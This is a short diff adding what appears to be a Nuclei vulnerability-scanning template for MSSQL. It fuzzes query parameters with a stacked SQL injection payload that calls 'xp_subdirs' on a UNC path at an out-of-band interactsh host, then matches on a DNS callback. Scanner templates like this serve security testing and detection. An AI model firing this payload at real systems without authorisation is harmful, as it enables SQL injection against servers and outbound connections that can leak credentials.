@@ -1,0 +1,28 @@
+id: fuzz-xp-subdirs-oob
+
+info:
+  name: MSSQL xp_subdirs UNC path OOB
+  author: openai
+  severity: high
+  tags: mssql,rce,sqli,oob,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      subdirs:
+        - "1; exec master..xp_subdirs '\\\\{{interactsh-url}}\\\\test'--"
+
+    fuzzing:
+      - part: query
+        mode: single
+        fuzz:
+          - "{{subdirs}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
